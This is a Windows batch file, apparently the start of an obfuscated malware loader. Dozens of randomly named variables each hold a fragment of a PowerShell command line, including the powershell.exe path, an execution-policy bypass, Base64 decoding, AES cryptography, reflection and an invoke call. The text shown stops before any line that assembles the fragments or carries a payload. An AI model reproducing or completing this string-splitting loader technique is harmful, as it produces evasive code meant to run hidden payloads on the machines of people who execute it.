@echo off
set "XEDDHOrdOv=ws"
set "GJOUEMyNEs=.e"
set "TQsOzUrvUN=we"
set "gwKwSjFUhE= C"
set "EZBkFqFuzA=Wi"
set "yUWltdVirj=co"
set "rcBdhHBMZS=he"
set "jNIpZDYOcd=st"
set "XRmrYzdQKM=do"
set "UtShdbmWzK=Po"
set "mbqqeOJYjG=ll"
set "VVHvVgUAQB=s\"
set "wusFninsvs=\W"
set "igxNrVBtdt=in"
set "hKJRFnFulz=32"
set "fwIJuECTgD=rS"
set "GqwapxKjMz=\v"
set "rRRdWnbFsc=po"
set "nhraaLnLbd=ll"
set "jJJbEhLozm=em"
set "ExFIzEZfnX=he"
set "JnfaKQopHS=xe"
set "EkvHBIgMDf=Sy"
set "bPhXhunayx=:\"
set "tEwbAdocaJ= /"
set "fEseyEDNzr=rs"
set "LmqSBEhaGN=we"
set "ysQVfnGIsX=1."
set "rpTTRjWgSA=py"
set "VFDSLHoGzv=y "
set "EcMJAYfIIJ=0\"
set "xbbMhChWLx=ow"
set "dsJvtckAsj=nd"
set "DeHIGyTSrz=cd"
set "ZaLVPxHGIa= %~dp0"
set "edTTBNeDEk=.Dis"
set "cEeCRftRvL=..-1"
set "plCrDASSjO= [Sy"
set "sdUoiHNZvU=$pjl"
set "QttrfSfWzN=();$"
set "gkjmTAhGiz==');"
set "DpIwpnmMKg=ress"
set "AfXsXFTKEN=bypa"
set "JzhZUpEBUw=Syst"
set "CCkCKuFlNl=hZWJ"
set "vkkbLqQGyx=ring"
set "wVCDdJNFOC=y.Ci"
set "kKsrBjgXUn=esaB"
set "NtokAuFVAm=736u"
set "CuTwKCNiGV=G = "
set "LMVlMyHMMw=ress"
set "XDLZrQWlLk=6] -"
set "zyZRcPlZDB=;$Gy"
set "JwcspelZPj=qAg."
set "sNpKzZmAwf=tiYt"
set "aFNQXIcjqI=and "
set "HidRolTbpD=SA.T"
set "hgrCapvcWq=0O+g"
set "zyRjRvTdRW=vert"
set "dbPGuXhhoe=y.Pa"
set "cxDdeZPSHz=n ''"
set "ncIJdaHkOk=lBlo"
set "gRocLRToLI=raph"
set "sOWBczoClp=iYta"
set "fNfcKtuuJo=Obje"
set "BSbZrXPQOP=.Sec"
set "NZctGeCSYe=ion."
set "JlnxsdQmqw=1] -"
set "rPfdLICJQQ=Secu"
set "ZADdAbXIVZ=ke($"
set "JqXQYXNvHa=rity"
set "UEBGrvozAg=; };"
set "ZpgvgHdTYP=O.Me"
set "WfObWsYTva=tW.D"
set "eZnuHWjETf=('%*'"
set "sdeObQPIXs= [st"
set "nUGbxdRwcR=);$p"
set "gLlSbnjOyZ=pres"
set "TXQZoCovzh=$tiY"
set "roXXprALgu=flec"
set "NPTSEHXfrO=-joi"
set "MPJIgWKXZz=ne);"
set "vAvEDFNhRy=morF"
set "lCHusEvvzt=Stre"
set "ulhGXXkxri=rt]:"
set "IwtfUnbPfq=onve"
set "AXdrZSYYkO=yBVz"
set "VTgyEBZCuJ=Obje"
set "jHdqFWXLGb=nage"
set "yCyrRyzDrg=saBm"
set "vroFITtANe=pety"
set "LRymdnFevu=hy.A"
set "rVeNDkipHr=ert]"
set "AjVRArgAUK=join"
set "mEeYqAwjUQ=ta);"
set "lSFKcBCBEz=oArr"
set "bstQApLnOz=-4] "
set "OKUUogVKFm=ose("
set "hJOsmZQAdH=]::N"
set "WfgNEyQFwk=$pjl"
set "xUWiSVZegX=IsqA"
set "VkufsflTsV=Star"
set "hFkBVecKbQ=oL'["
set "qcBREcpEag=y.Pa"
set "LFPYkTqthI=.Con"
set "aotVVSBCeC=null"
set "ohvPXdfdge=-1.."
set "qUytguOHUK=e = "
set "MIKrZEpXkl=yste"
set "MmhZglnETQ=bjec"
set "mHuFUPYwHO=New-"
set "eeycZfnXIS=iTtW"
set "eNqGNlVwWa= if "
set "kQhHJRmSGH=stem"
